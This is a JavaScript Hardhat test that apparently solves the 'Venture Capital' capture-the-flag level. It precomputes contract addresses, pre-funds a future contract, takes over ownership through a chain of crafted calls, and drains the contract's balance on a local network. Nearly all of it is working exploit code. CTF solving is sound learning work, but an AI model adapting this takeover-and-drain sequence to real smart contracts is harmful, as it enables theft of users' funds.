const { util } = require("chai");
const { ethers } = require("hardhat");
const hre = require('hardhat');

// https://github.com/cypherpunks-core/cypherpunks-ctf/blob/dev/contracts/levels/VentureCapitalFactory.sol

describe.only("Venture Capital", function () {
  it("hardhat local network", async function () {
    const provider = ethers.provider;

    const [player, deployer, client, client2] = await hre.ethers.getSigners();

    const preComputedVCAddr = ethers.utils.getContractAddress({
        from: deployer.address,
        nonce: await deployer.getTransactionCount()
    });
    console.log('preComputedVCAddr:', preComputedVCAddr);

    const preComputedDAAddr = ethers.utils.getContractAddress({
        from: preComputedVCAddr,
        nonce: 1
    });
    console.log('preComputedDAAddr:', preComputedDAAddr);

    player.sendTransaction({
        from: player.address,
        to: preComputedDAAddr,
        value: ethers.utils.parseEther('0.424242')
    });

    const VCFactory = await ethers.getContractFactory("VentureCapital");
    const vc = await VCFactory.connect(deployer).deploy({ value: ethers.utils.parseEther('1.0') });
    await vc.deployed();

    console.log('vc address', vc.address);

    const da = await ethers.getContractAt(
        require('../artifacts/contracts/VentureCapital.sol/DeveloperAuthorizer.json').abi,
        await vc.developerAuthorizer(),
        player
    );

    const newClientTx = await vc.connect(player).newClient(client.address, '1390849295786071768276380950238675083608645509734', { value: 100 });
    await newClientTx.wait();

    console.log('52 owner.address:', await vc.owner());

    const byeClientTx = await vc.connect(player).byeClient();
    await byeClientTx.wait();

    const managementEnableTx = await vc.managementEnable(player.address);
    await managementEnableTx.wait();

    const turnOffTx = await da.connect(player).turnOff({ value: ethers.utils.parseEther('0.575758') });
    await turnOffTx.wait();

    console.log(await da.developerMode());

    console.log('64 owner.address:', await vc.owner());

    console.log('clients length: ', await vc.getClientsLength());

    const closeTx = await vc.connect(player).close();
    await closeTx.wait();

    console.log('vc balance: ', await provider.getBalance(vc.address));
    });
});
